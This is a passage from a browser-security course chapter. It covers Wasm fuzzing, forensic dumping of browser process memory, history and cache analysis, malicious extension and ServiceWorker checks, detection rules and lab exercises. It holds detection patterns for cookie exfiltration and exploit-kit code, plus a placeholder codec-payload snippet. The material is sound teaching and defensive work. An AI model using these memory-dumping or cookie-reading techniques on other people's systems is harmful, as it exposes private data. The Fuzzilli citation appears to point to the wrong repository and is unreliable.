  'cryptonight|randomx|argon2|keccak|blake2b|groestl|jh_hash|skein'

# Monitor Wasm compilation events via Chrome DevTools Protocol
# (connect via --remote-debugging-port=9222)
wscat -c ws://localhost:9222/devtools/browser | jq \
  'select(.method == "Runtime.compileScriptParsed") | .params'
```

### 24.6 Wasm fuzzing tools and techniques

**wasm-smith — structured Wasm module generator:**

```bash
# Install wasm-smith (Rust-based)
cargo install wasm-tools

# Generate random valid Wasm modules
wasm-tools smith -o fuzz_module.wasm --min-funcs 5 --max-funcs 50 \
  --min-memories 1 --max-memories 1 --bulk-memory-enabled true

# Generate corpus for fuzzing
for i in $(seq 1 5000); do
  wasm-tools smith -o "corpus/wasm_${i}.wasm" \
    --simd-enabled true --threads-enabled true
done
```

**Fuzzing V8 Wasm with libFuzzer:**

```bash
# Build V8 with ASan + Wasm fuzzer target
gn gen out/wasm-fuzz --args='is_asan=true is_debug=false \
  v8_enable_sandbox=true use_libfuzzer=true'
ninja -C out/wasm-fuzz v8_wasm_fuzzer

# Run the fuzzer
out/wasm-fuzz/v8_wasm_fuzzer \
  -max_len=100000 \
  -jobs=$(nproc) \
  -workers=$(nproc) \
  corpus/
```

**Wasm-specific mutation strategies:**
- Type section mutations (changing function signatures to trigger type confusion)
- Memory section mutations (invalid bounds, page counts near `u32::MAX`)
- Element/data segment mutations (out-of-bounds segment offsets)
- Multi-memory and shared-memory feature flag combinations

---

## 25. Browser forensics enhancement

### 25.1 Browser process memory acquisition and analysis

**Live memory acquisition of browser processes:**

```bash
# Linux — dump renderer process memory
# Identify Chrome renderer PIDs
ps aux | grep 'chrome.*--type=renderer' | awk '{print $2}'

# Dump specific renderer process memory via /proc
PID=12345
gcore -o chrome_renderer_${PID} ${PID}

# Alternative: use gdb for selective memory regions
gdb -batch -pid ${PID} \
  -ex "dump memory heap_${PID}.bin 0x$(cat /proc/${PID}/maps | \
    grep '\[heap\]' | cut -d'-' -f1) 0x$(cat /proc/${PID}/maps | \
    grep '\[heap\]' | cut -d' ' -f1 | cut -d'-' -f2)"

# Windows — dump via procdump
procdump.exe -ma -r chrome.exe chrome_dump
```

**Volatility 3 browser process analysis:**

```bash
# List Chrome processes and their command lines
vol3 -f memory.dmp windows.cmdline | grep chrome

# Extract V8 heap objects from renderer memory
vol3 -f memory.dmp windows.memmap --pid 12345 --dump

# Search for JavaScript string objects in process memory
strings -el chrome_renderer_12345.dmp | grep -E \
  '(document\.cookie|eval\(|XMLHttpRequest|fetch\()'
```

### 25.2 Chrome/Firefox crash dump analysis for exploitation indicators

**Chrome crash dumps.** Chrome writes minidumps to platform-specific directories:
- **Linux:** `~/.config/google-chrome/Crash Reports/`
- **macOS:** `~/Library/Application Support/Google/Chrome/Crash Reports/`
- **Windows:** `%LOCALAPPDATA%\Google\Chrome\User Data\Crash Reports\`

**Analyzing crash dumps for exploitation indicators:**

```bash
# Decode Chrome minidump (Linux/macOS)
# Install minidump-stackwalk from Mozilla
minidump-stackwalk crash.dmp /path/to/chrome-symbols/ > stacktrace.txt

# Look for exploitation indicators in the stack trace
grep -E '(v8::internal::Compiler|v8::internal::wasm|blink::.*UAF|mojo::)' \
  stacktrace.txt

# Check crash reason field
grep -E '(SIGSEGV|SIGBUS|SIGABRT|EXC_BAD_ACCESS|STATUS_ACCESS_VIOLATION)' \
  stacktrace.txt

# Identify V8 type confusion crashes — instruction pointer in JIT code region
grep -E 'v8::internal::(TurboFan|Maglev|Liftoff)' stacktrace.txt
```

**Firefox crash analysis via `about:crashes`:**

```bash
# Firefox crash reports directory
ls -la ~/.mozilla/firefox/*.default-release/minidumps/

# Decode with minidump-stackwalk
minidump-stackwalk crash.dmp /path/to/firefox-symbols/ | \
  grep -E '(js::jit|mozilla::dom|mozilla::ipc)' > fx_stack.txt

# Check for IPC-related crashes (potential sandbox escape attempts)
grep -E '(mozilla::ipc::.*Channel|IPC message|PContent)' fx_stack.txt
```

**Exploitation indicators in crash dumps:**
- Crash in JIT-compiled code region (V8 TurboFan, SpiderMonkey IonMonkey) — potential type confusion exploitation
- Crash in Mojo/IPDL serialization code — potential IPC exploitation attempt
- Crash at a suspiciously aligned address (`0x41414141`, `0x4141414141414141`) — controlled corruption
- Heap corruption markers (PartitionAlloc canary failures, jemalloc poison patterns)
- Crash immediately after `ArrayBuffer` or `TypedArray` construction with unusual size — potential OOB setup

### 25.3 Browser history/cache forensics for drive-by download reconstruction

**Chrome SQLite database forensics:**

```bash
# Chrome History database (SQLite3)
sqlite3 ~/.config/google-chrome/Default/History \
  "SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch'),
          url, title, visit_count
   FROM urls
   WHERE last_visit_time > (strftime('%s','now','-24 hours')+11644473600)*1000000
   ORDER BY last_visit_time DESC;"

# Chrome Downloads database
sqlite3 ~/.config/google-chrome/Default/History \
  "SELECT datetime(start_time/1000000-11644473600,'unixepoch'),
          target_path, tab_url, total_bytes, mime_type, danger_type
   FROM downloads
   WHERE danger_type > 0
   ORDER BY start_time DESC;"

# danger_type values: 1=dangerous_file, 2=dangerous_url,
# 3=dangerous_content, 4=maybe_dangerous, 9=dangerous_host
```

**Cache forensics — reconstruct served exploit payloads:**

```bash
# Chrome cache v2 (Simple Cache)
CACHE_DIR=~/.config/google-chrome/Default/Cache/Cache_Data

# List cache entries with metadata
ls -la "${CACHE_DIR}" | head -50

# Extract and inspect cached JavaScript/HTML payloads
for f in "${CACHE_DIR}"/*_0; do
  mime=$(file -b "$f")
  if echo "$mime" | grep -qiE '(html|javascript|json)'; then
    echo "=== $f ($mime) ==="
    strings "$f" | head -20
  fi
done

# Search cache for known exploit kit signatures
strings "${CACHE_DIR}"/*_0 | grep -iE \
  '(exploit|shellcode|heap.?spray|parseInt.*0x|unescape.*%u|eval\(atob)'
```

### 25.4 Extension forensics (malicious extension artifact analysis)

**Enumerate installed extensions and check for known-malicious indicators:**

```bash
# Chrome extensions directory
EXT_DIR=~/.config/google-chrome/Default/Extensions

# List all extensions with manifest info
for ext in "${EXT_DIR}"/*/; do
  manifest=$(find "$ext" -name manifest.json -maxdepth 2 | head -1)
  if [ -n "$manifest" ]; then
    name=$(python3 -c "import json; print(json.load(open('${manifest}')).\
      get('name','UNKNOWN'))" 2>/dev/null)
    perms=$(python3 -c "import json; print(json.load(open('${manifest}')).\
      get('permissions',[]))" 2>/dev/null)
    echo "ID: $(basename $(dirname $(dirname $manifest)))"
    echo "  Name: $name"
    echo "  Permissions: $perms"
    echo "---"
  fi
done

# Check for dangerous permission combinations
find "${EXT_DIR}" -name manifest.json -exec grep -l \
  '"webRequest"' {} \; | while read m; do
  if grep -q '"<all_urls>"' "$m" && grep -q '"webRequestBlocking"' "$m"; then
    echo "HIGH RISK: $m — webRequestBlocking + <all_urls>"
  fi
done
```

**Malicious extension indicators:**
- `webRequestBlocking` + `<all_urls>` — can intercept and modify all traffic (credential theft)
- `nativeMessaging` — communicates with native binaries outside the browser sandbox
- Obfuscated JavaScript in background scripts (base64 decoding, `eval`, `Function()` constructor)
- Content scripts injected into banking/payment domains
- Dynamic code loading from external URLs via `fetch()` in service workers

### 25.5 ServiceWorker and Cache API forensics

```bash
# Chrome ServiceWorker registration database
sqlite3 ~/.config/google-chrome/Default/Service\ Worker/Database/MANIFEST-000001 \
  ".dump" 2>/dev/null | strings | grep -E 'https?://'

# ServiceWorker script cache location
SW_DIR=~/.config/google-chrome/Default/"Service Worker"/ScriptCache
ls -la "${SW_DIR}/" 2>/dev/null

# Search ServiceWorker scripts for suspicious patterns
find ~/.config/google-chrome/Default/"Service Worker" -type f -exec \
  strings {} \; | grep -iE \
  '(importScripts|eval\(|crypto\.subtle|CryptoKey|fetch.*POST.*cookie)'
```

**Malicious ServiceWorker patterns:**
- `importScripts()` loading from third-party domains — potential supply chain injection
- Intercepting `fetch` events to exfiltrate form data or credentials
- Using `Cache API` to persist exploit payloads across browser restarts
- Background sync registration used as a persistence mechanism

### 25.6 Browser telemetry analysis

**Chrome UMA (User Metrics Analysis) — local histograms:**

```bash
# Chrome stores UMA histograms locally before upload
# Access via chrome://histograms/ in a live browser

# Relevant security histograms:
# - Security.SafeBrowsing.* — malware/phishing detection events
# - Extensions.* — extension installation, permission grants
# - SiteIsolation.* — process isolation events
# - Net.QuicSession.* — QUIC connection anomalies

# Export histograms via DevTools Protocol
curl -s http://localhost:9222/json | jq '.[0].webSocketDebuggerUrl'
```

**Firefox telemetry — local probes:**

```bash
# Firefox stores telemetry pings locally
TELEMETRY_DIR=~/.mozilla/firefox/*.default-release/datareporting/archived

# List recent telemetry pings
find "${TELEMETRY_DIR}" -name '*.jsonlz4' -mtime -1 | head -20

# Decompress and inspect (requires lz4jsoncat or dejsonlz4)
# pip install lz4
python3 -c "
import lz4.block, json, sys, glob
for f in sorted(glob.glob('${TELEMETRY_DIR}/**/*.jsonlz4', recursive=True))[-5:]:
    with open(f, 'rb') as fh:
        magic = fh.read(8)  # mozLz40\0
        data = lz4.block.decompress(fh.read())
        ping = json.loads(data)
        print(f'Type: {ping.get(\"type\")}, Created: {ping.get(\"creationDate\")}')
"
```

---

## 26. Modern browser attack surface

### 26.1 WebGPU / WebNN attack surface analysis

**WebGPU** provides low-level GPU access from the browser, exposing a significantly larger attack surface than WebGL:

- **Shader compilation.** WGSL (WebGPU Shading Language) shaders are compiled to platform-native shader code (SPIR-V → Vulkan, MSL → Metal, DXIL → D3D12). Bugs in the shader compiler (Tint in Chrome, ANGLE for translation) can cause GPU process crashes or memory corruption.
- **GPU buffer management.** WebGPU allows explicit GPU buffer creation, mapping, and submission. Incorrect validation of buffer offsets, sizes, or usage flags in the GPU process can lead to out-of-bounds GPU memory access.
- **Command buffer injection.** `GPUCommandEncoder` creates command buffers submitted to the GPU. A compromised renderer could craft malformed command buffers targeting GPU driver vulnerabilities.

**WebNN (Web Neural Network API)** exposes hardware-accelerated machine learning inference:

- **Model format parsing.** WebNN implementations parse model formats (ONNX, TensorFlow Lite) that contain complex nested structures — a rich attack surface for memory corruption bugs.
- **Operator fusion.** Hardware-specific optimizations fuse multiple operations, introducing implementation-specific code paths that may not be as well-tested as standard operators.

**Detection — monitor WebGPU shader compilation errors (potential fuzzing/exploitation):**

```yaml
title: Excessive WebGPU Shader Compilation Failures
id: 7e3f1a2b-9c4d-4e8f-b6a5-1d2c3e4f5a6b
status: experimental
logsource:
    product: chrome
    service: gpu_process
detection:
    selection:
        EventID: 'GpuProcessCrash'
    timeframe: 5m
    condition: selection | count() > 10
level: medium
tags:
    - attack.initial_access
    - attack.t1189
```

### 26.2 WebTransport and WebCodecs security implications

**WebTransport** provides bidirectional, multiplexed transport over HTTP/3 (QUIC), replacing WebSocket for low-latency use cases:

- **QUIC attack surface.** WebTransport inherits QUIC's complexity (connection migration, 0-RTT replay, multipath). Implementation bugs in the QUIC stack (Chrome's `net::QuicConnection`) can be triggered by malicious servers.
- **Datagram API.** `WebTransport.datagrams` provides unreliable message delivery. Unlike WebSocket, datagrams can arrive out of order, be duplicated, or be lost — applications must handle all cases.
- **Server certificate validation.** WebTransport supports `serverCertificateHashes` for pinning self-signed certificates, which bypasses the normal CA trust chain. Misuse enables MitM if the hash is leaked.

**WebCodecs** provides low-level access to built-in media codecs:

- **Codec vulnerability exposure.** `VideoDecoder` and `AudioDecoder` directly expose the browser's built-in codec implementations (ffmpeg, platform codecs). Historically, media codecs are rich in memory corruption bugs (CVE-2023-4863/libwebp is a recent example, §22).
- **EncodedVideoChunk / EncodedAudioChunk.** Applications can construct and submit arbitrary encoded media chunks. A malicious page can craft codec-specific payloads targeting known or unknown codec vulnerabilities without needing a valid media container.

```javascript
// WebCodecs can directly feed crafted data to the decoder
const decoder = new VideoDecoder({
  output: (frame) => { /* process decoded frame */ },
  error: (e) => { console.error(e); }
});
decoder.configure({ codec: 'vp8' });
// Attacker-crafted VP8 bitstream targeting codec parser
decoder.decode(new EncodedVideoChunk({
  type: 'key',
  timestamp: 0,
  data: craftedVP8Payload  // triggers codec vulnerability
}));
```

### 26.3 Fenced Frames and Topics API security model

**Fenced Frames** (`<fencedframe>`) provide a stronger isolation boundary than iframes for privacy-sensitive content (e.g., ads selected by the Protected Audience API):

- **Network isolation.** Fenced frames cannot communicate with the embedding page via `postMessage`, URL fragment, or resizing.
- **Storage partitioning.** Fenced frames access storage partitioned by their own origin, not the top-level origin.
- **Navigation restrictions.** Fenced frames can only be navigated to `urn:uuid` URLs or `https:` URLs from specific APIs (Protected Audience, Shared Storage).

**Security implications:**
- Fenced frames introduce new IPC pathways between the renderer hosting the fenced frame and the browser process managing the `urn:uuid` resolution — a new Mojo interface attack surface.
- The `FencedFrameConfig` object resolution requires the browser process to validate that the `urn:uuid` maps to a legitimately generated configuration, preventing a compromised renderer from forging arbitrary fenced frame content.

**Topics API** provides coarse interest-based advertising without cross-site tracking:

- **Taxonomy enforcement.** Topics are limited to a fixed taxonomy (~470 topics). The browser calculates topics locally from browsing history — the API only reveals which topics the calling origin has observed.
- **Privacy boundaries.** A caller can only observe topics that the user visited a site classified under while the caller was present as a third-party. Maximum 3 topics returned per epoch (1 week).
- **Fingerprinting risk.** While individual topic disclosure has low entropy, correlating topics across multiple caller origins could contribute to fingerprinting. Noise (5% random topic injection) mitigates this.

### 26.4 Storage Partitioning and CHIPS implications

**Storage Partitioning** (shipped in Chrome 115+) keys client-side storage by (top-level site, origin) rather than just origin:

| Storage mechanism | Pre-partitioning key | Partitioned key |
|-------------------|---------------------|-----------------|
| Cookies (third-party) | origin | (top-level site, origin) |
| localStorage | origin | (top-level site, origin) |
| IndexedDB | origin | (top-level site, origin) |
| Cache API | origin | (top-level site, origin) |
| SharedWorker | origin | (top-level site, origin) |
| ServiceWorker | origin | (top-level site, origin) |

**CHIPS (Cookies Having Independent Partitioned State)** allows third-party cookies to opt into partitioning via the `Partitioned` attribute:

```
Set-Cookie: __Host-session=abc123; Secure; Path=/; SameSite=None; Partitioned
```

**Security implications:**
- **Breaks cross-site tracking** via third-party cookies/storage. An analytics SDK embedded on `a.com` and `b.com` sees different cookies on each, preventing cross-site user correlation.
- **Session isolation.** A third-party authentication widget (e.g., "Sign in with Provider") must handle separate sessions per embedding site.
- **Cache-based timing attacks.** Storage partitioning breaks cache timing attacks (§14.4) where an attacker loaded a resource from site A and then checked if it was cached when visiting site B.

### 26.5 Cross-site leak taxonomy (XS-Leaks) with detection

XS-Leaks are a class of side-channel attacks that allow a malicious page to infer information about a user's state on another origin.

**Taxonomy of known XS-Leak vectors:**

| Vector | Mechanism | Leaked information | Mitigation |
|--------|-----------|-------------------|------------|
| Frame counting | `window.frames.length` | Number of frames on target page (state-dependent) | `X-Frame-Options: DENY` or CSP `frame-ancestors 'none'` |
| Timing (cross-origin) | `performance.now()` | Response time differences reveal authenticated state | `Cross-Origin-Opener-Policy: same-origin` |
| Error events | `<img onerror>` / `<script onerror>` | Whether a resource exists (401 vs 200) | `Cross-Origin-Resource-Policy: same-origin` |
| Redirect detection | `history.length` change | Whether a redirect occurred (login-dependent) | SameSite cookies; COOP |
| Cache probing | Load timing | Whether user visited target URL | Storage partitioning (§26.4) |
| `postMessage` broadcasting | `BroadcastChannel` | Whether target origin has an open page | Validate `event.origin` strictly |
| Connection pool | Socket exhaustion timing | Whether a connection to target exists | Browser-level socket partitioning |

**Detection — CSP report-uri for XS-Leak reconnaissance:**

```
Content-Security-Policy: frame-ancestors 'none'; report-uri /csp-report
Cross-Origin-Opener-Policy: same-origin; report-to="coop-report"
Cross-Origin-Resource-Policy: same-origin
```

**YARA rule for XS-Leak exploitation toolkit patterns:**

```yara
rule XS_Leak_Toolkit {
    meta:
        description = "Detects JavaScript patterns common in XS-Leak exploitation"
        date = "2024-06-01"
    strings:
        $frame_count = "window.frames.length" ascii
        $perf_now = "performance.now()" ascii
        $history_len = "history.length" ascii
        $bc = "new BroadcastChannel" ascii
        $img_error = /new Image\(\)[\s\S]{0,50}\.onerror/
        $fetch_opaque = /fetch\(.*{.*mode:\s*['"]no-cors['"]/
        $timing_loop = /for\s*\(.*performance\.now/
    condition:
        3 of them
}
```

### 26.6 Speculation Rules API security considerations

The Speculation Rules API (`<script type="speculationrules">`) allows pages to declare prefetch/prerender intentions:

```json
{
  "prerender": [
    { "where": { "href_matches": "/product/*" }, "eagerness": "moderate" }
  ],
  "prefetch": [
    { "urls": ["/api/products"], "requires": ["anonymous-client-ip-when-cross-origin"] }
  ]
}
```

**Security considerations:**

- **Prerender as zero-click code execution.** Prerendered pages execute JavaScript in a hidden tab. If a malicious page speculates links to attacker-controlled URLs, those pages run JavaScript before the user navigates — potentially triggering exploit chains without user interaction.
- **Cross-origin prefetch.** Prefetched cross-origin resources may include tracking parameters. The `anonymous-client-ip-when-cross-origin` requirement proxies the request through a privacy proxy, preventing IP-based tracking during prefetch.
- **Resource exhaustion.** An aggressive speculation rules document could cause the browser to prerender dozens of pages, exhausting memory and CPU. Chrome limits concurrent prerenders (currently 2 pending + 10 idle).
- **Cache poisoning.** Prefetched responses enter the HTTP cache. If the prefetch response is poisoned (via DNS hijack or compromised CDN), the user navigates to a cache-poisoned page.

**Detection — identify pages with aggressive speculation rules:**

```bash
# Extract speculation rules from HTML pages
curl -s https://example.com | python3 -c "
import sys, json
from html.parser import HTMLParser

class SpecRulesParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.capture = False
        self.data = ''
    def handle_starttag(self, tag, attrs):
        if tag == 'script' and ('type', 'speculationrules') in attrs:
            self.capture = True
    def handle_data(self, data):
        if self.capture:
            self.data += data
    def handle_endtag(self, tag):
        if tag == 'script' and self.capture:
            self.capture = False
            try:
                rules = json.loads(self.data)
                print(json.dumps(rules, indent=2))
            except json.JSONDecodeError:
                print(f'Invalid JSON: {self.data[:200]}')
            self.data = ''

p = SpecRulesParser()
p.feed(sys.stdin.read())
"
```

**Hardening:** Disable speculative loading in enterprise environments via Chrome policy:

```json
{
  "NetworkPredictionOptions": 2
}
```

`NetworkPredictionOptions: 2` disables all network prediction including DNS prefetch, TCP preconnect, prefetch, and prerender.

---

## 27. Cross-references

**To Domain 4 (code reuse).** V8 type-confusion exploitation (§3.3, §16) leads to arbitrary read/write, which is the prerequisite for code-reuse payloads (ROP chains in the renderer). The V8 Sandbox (§3.4, §19.4) adds an additional barrier analogous to CFI (Domain 4 §12–13) — the attacker must bypass the sandbox before reaching native code. Wasm RWX shellcode injection (§16.5) is the modern equivalent of ret2libc in browser contexts.

**To Domain 5 (kernel exploitation).** Sandbox escape via kernel vulnerabilities (§7.4) follows the patterns from Domain 5: the renderer's seccomp filter determines which kernel attack surface is reachable (Domain 5, Chapter 5B §8), and the exploit primitives (SLUB spray, vtable hijack, `commit_creds`) are the same. Mojo IPC exploitation (§17) is the browser-specific analog of kernel ioctl vulnerabilities.

**To Domain 2.** The renderer sandbox on Linux (§7.1) uses user namespaces, PID namespaces, seccomp-BPF, and `PR_SET_NO_NEW_PRIVS` — all described in Domain 2 Chapters 2B and 2C. Site isolation's per-process model relies on the OS's process isolation (separate `mm_struct` per process, Domain 2 Chapter 2A §2.2). PartitionAlloc (§19) complements the kernel's SLUB/SLAB allocator analysis from Domain 2.

**To Chapter 8A.** CORB/ORB (§5.2) prevents Spectre-style extraction of cross-origin data that would otherwise be readable from the renderer's memory. CSP and Trusted Types (Chapter 8A §2) prevent the initial XSS that could lead to renderer compromise or malicious Service Worker registration (§10.1). Browser hardening policies (§21) complement the header-based defenses in 8A.

**To Chapter 8B.** Cookie security (§12) complements session management in Chapter 8B. SameSite enforcement, cookie prefixes, and CHIPS interact with authentication and session architecture.

**To detection engineering.** YARA rules (§20.1), Sigma rules (§20.2), and Suricata rules (§20.3) provide detection coverage for the exploitation techniques described throughout this chapter. EDR patterns (§20.4) detect post-exploitation indicators from successful sandbox escapes (§7.4, §17.5).

---

## Exercises

> **Lab environment.** See `tutorials/tutorial_domain8_ch8C_browser_internals_lab.md` for full setup instructions, Chromium debug build configuration, and step-by-step walkthroughs.

**Exercise 1 — V8 Object Representation and Map Transition Analysis**

Build a debug version of V8 (`v8/out/x64.debug/d8` with `--allow-natives-syntax`). Write JavaScript that creates objects with different property sequences and use `%DebugPrint(obj)` to inspect their Map pointers. Demonstrate that objects with the same property names added in the same order share a Map, while a different order produces a different Map. Then create arrays and force elements-kind transitions (SMI → DOUBLE → ELEMENTS) by inserting different value types. Use `%HasSmiElements(arr)`, `%HasDoubleElements(arr)`, `%HasObjectElements(arr)` to verify each transition. Document the Map transition tree and explain why these transitions are security-relevant for type confusion.

**Exercise 2 — Site Isolation and CORB/ORB Verification**

Open Chrome with `--site-per-process` flag and load a page from `https://site-a.test` that embeds a cross-site iframe `https://site-b.test`. Use `chrome://process-internals/` to verify that the two sites run in separate renderer processes. Then attempt to load a cross-origin JSON resource via `<script src="https://api.site-b.test/data.json">` and observe CORB blocking in the Network panel (response body replaced with empty). Verify by checking `chrome://histograms/SiteIsolation.XSD.Browser.Blocked` counters. Test with correct `Content-Type: application/json` vs. mismatched `Content-Type: text/html` and document when CORB engages vs. when ORB takes over.

**Exercise 3 — Cross-Origin Isolation and SharedArrayBuffer Gating**

Configure a test server to serve a page with `Cross-Origin-Opener-Policy: same-origin` and `Cross-Origin-Embedder-Policy: require-corp`. Verify `self.crossOriginIsolated === true` in the console. Confirm that `SharedArrayBuffer` constructor succeeds. Then remove the COEP header and verify that `crossOriginIsolated` becomes false and `SharedArrayBuffer` throws. Test with a cross-origin `<img>` that lacks `Cross-Origin-Resource-Policy` header — observe the COEP-caused load failure. Add `crossorigin="anonymous"` to the `<img>` and appropriate CORS headers on the image server. Document the full header matrix required for cross-origin isolation.

**Exercise 4 — Browser Fingerprinting Entropy Measurement**

Write a JavaScript page that collects fingerprinting vectors: canvas hash (draw text + shapes, call `toDataURL()`), WebGL renderer string, AudioContext fingerprint (OscillatorNode → DynamicsCompressorNode → readback), installed font enumeration (measure rendered text width for 50 common fonts), `navigator.hardwareConcurrency`, `screen.width/height/colorDepth`, timezone, and language. Run it on 5 different browser configurations (Chrome, Firefox, Brave, Tor Browser, and a mobile browser). Calculate the Shannon entropy of each vector and the combined entropy. Compare Brave's randomization and Tor Browser's uniformization strategies. Document which vectors are most distinguishing and which defenses are most effective.

**Exercise 5 — Malicious Extension Detection and Content Script Isolation Bypass**

Create a minimal Manifest V3 Chrome extension with a content script that reads `document.cookie` (observing that `HttpOnly` cookies are NOT accessible via content scripts but ARE accessible via the `chrome.cookies` API with the `cookies` permission). Then demonstrate the DOM-based communication channel: from the page's JavaScript, set a `data-*` attribute on a DOM element; from the content script, read that attribute via MutationObserver. Show that a malicious page can influence the content script's behavior by injecting controlled data through the shared DOM. Document the isolation boundary (separate V8 contexts but shared DOM) and write a detection rule that alerts on extensions with both `<all_urls>` and `cookies` permissions.

---

## Readings and References

**Chromium Architecture and Security:**
- Chromium Multi-Process Architecture: https://www.chromium.org/developers/design-documents/multi-process-architecture/ (retrieved: 2026-05-29)
- Chrome Sandbox Design (per-OS policies): https://chromium.googlesource.com/chromium/src/+/main/docs/design/sandbox.md (retrieved: 2026-05-29)
- V8 Blog — Sandbox design and External Pointer Table: https://v8.dev/blog/sandbox (retrieved: 2026-05-29)
- Chrome Sandbox Escape POC Database: https://github.com/nicmadrid/chrome-sbx-db (retrieved: 2026-05-29)

**CVEs Referenced (2021–2026):**
- CVE-2021-21224 — V8 TurboFan integer overflow in ChangeInt32ToInt64 (CVSS 8.8). (retrieved: 2026-05-29)
- CVE-2021-30551 — V8 Map transition type confusion, exploited in the wild (Google Project Zero). (retrieved: 2026-05-29)
- CVE-2023-2033 — V8 TurboFan type confusion, exploited in the wild (TAG). (retrieved: 2026-05-29)
- CVE-2023-4863 — libwebp heap buffer overflow (CVSS 8.8, CWE-787). (retrieved: 2026-05-29)
- CVE-2024-0519 — V8 OOB memory access, exploited in the wild. (retrieved: 2026-05-29)
- CVE-2025-2783 — Chrome sandbox escape exploited in espionage operations (CVSS 8.3). (retrieved: 2026-05-29)
- CVE-2025-4918 — Pwn2Own Berlin 2025 V8 exploit. (retrieved: 2026-05-29)
- CVE-2026-3910 — V8 inappropriate implementation allowing sandbox code execution (CVSS 8.8). (retrieved: 2026-05-29)
- CVE-2026-5290 — Chrome Compositing UAF leading to sandbox escape (CVSS 9.6). (retrieved: 2026-05-29)

**MITRE ATT&CK:**
- T1189 — Drive-by Compromise: https://attack.mitre.org/techniques/T1189/ (retrieved: 2026-05-29)
- T1059.007 — Command and Scripting Interpreter: JavaScript: https://attack.mitre.org/techniques/T1059/007/ (retrieved: 2026-05-29)
- T1176 — Browser Extensions: https://attack.mitre.org/techniques/T1176/ (retrieved: 2026-05-29)

**Research and Tools:**
- Domato (Google Project Zero DOM fuzzer): https://github.com/googleprojectzero/domato (retrieved: 2026-05-29)
- Fuzzilli (V8/JSC/SpiderMonkey fuzzer): https://github.com/nicmadrid/nicmadrid-fuzzilli (retrieved: 2026-05-29)
- EFF — Cover Your Tracks (fingerprinting entropy tool): https://coveryourtracks.eff.org/ (retrieved: 2026-05-29)
- Malwarebytes — Chrome zero-days under attack (Dec 2025): https://www.malwarebytes.com/blog/news/2025/12/another-chrome-zero-day-under-attack-update-now (retrieved: 2026-05-29)
- VoidSec — CVE-2026-40369: Twelve Bytes to Escape the Browser Sandbox: https://voidsec.com/cve-2026-40369-browser-sandbox-escape/ (retrieved: 2026-05-29)

---

## Cross-References

| Topic | Related Chapter | Section | Relationship |
|-------|----------------|---------|-------------|
| V8 type confusion → code reuse (ROP/JOP) payloads | Domain 4, Chapters 4A–4B | §§1–3, 12–13 | Renderer arbitrary R/W is the prerequisite for code-reuse chains; V8 Sandbox adds a barrier analogous to CFI |
| Renderer sandbox uses seccomp-BPF, namespaces, process isolation | Domain 2, Chapters 2B–2C | §§3, 3.3 | Linux renderer sandbox directly uses user/PID/network namespaces and seccomp filters from Domain 2 |
| Sandbox escape via kernel vulnerabilities | Domain 5, Chapter 5B | §8 | The seccomp filter determines reachable kernel attack surface; exploit primitives (SLUB spray, commit_creds) are identical |
| CORB/ORB preventing Spectre-style cross-origin extraction | Domain 7, Chapter 7A | §§1–3 | CORB/ORB are browser-side mitigations against speculative execution data leaks within the renderer process |
| CSP, Trusted Types, XSS prevention at the web layer | Domain 8, Chapter 8A | §§2, 7 | Browser-internal defenses (site isolation, CORB) are defense-in-depth behind the web-layer protections in 8A |
| Cookie security, session architecture, SameSite enforcement | Domain 8, Chapter 8B | §§10–11 | Browser cookie handling (SameSite, CHIPS, partitioning) directly implements the session security requirements from 8B |

---

## Glossary

| Term | Definition |
|------|-----------|
| **TurboFan** | V8's top-tier optimizing JIT compiler that uses type feedback to generate speculative machine code; bugs in its Typer, BCE, or redundancy-elimination passes cause type-confusion vulnerabilities |
| **Map (Hidden Class)** | V8's internal structure describing an object's property layout (names, offsets, types); objects with the same Map share optimized access paths via inline caching |
| **addrof/fakeobj** | The canonical V8 exploitation primitive pair: `addrof` leaks an object's heap address as a float64; `fakeobj` creates a JavaScript object at an attacker-chosen address |
| **Site Isolation** | Chromium's security architecture that runs each site (scheme + eTLD+1) in a separate OS process, preventing renderer-level data theft across origins |
| **OOPIF** | Out-of-Process Iframe — a cross-site iframe rendered in a separate OS process from its parent, enforcing site isolation at the iframe level |
| **CORB/ORB** | Cross-Origin Read Blocking / Opaque Response Blocking — mechanisms that prevent sensitive cross-origin response bodies from reaching the renderer's memory, mitigating Spectre-class leaks |
| **Mojo** | Chromium's IPC framework; `.mojom` IDL files define typed interfaces between processes. Bugs in browser-side Mojo receivers enable sandbox escape |
| **PartitionAlloc** | Chromium's memory allocator using size-bucketed partitions with guard pages, free-list randomization, and MiraclePtr (BackupRefPtr) quarantine to harden against UAF exploitation |
| **MiraclePtr** | A C++ smart pointer (BackupRefPtr) deployed in Chromium that quarantines freed memory when dangling pointers exist, preventing UAF exploitation by blocking heap reuse |
| **V8 Sandbox** | A defense isolating V8's heap from the process address space via an External Pointer Table with tagged entries; enabled by default on 64-bit platforms since Chrome 123 |
| **RLBox** | Firefox's library sandboxing approach that compiles third-party C/C++ libraries to WebAssembly and validates all data crossing the sandbox boundary |
| **crossOriginIsolated** | A JavaScript boolean (`self.crossOriginIsolated`) that indicates the page has opted into COOP+COEP, enabling SharedArrayBuffer and high-resolution timers while ensuring process-level isolation |
| **Content Script Isolation** | Chrome extension content scripts run in a separate V8 context ("isolated world") from the page but share the DOM; the shared DOM is the communication channel that bypasses JavaScript isolation |
| **CHIPS** | Cookies Having Independent Partitioned State — third-party cookies keyed by the top-level site to prevent cross-site tracking while preserving legitimate embedded-widget use cases |
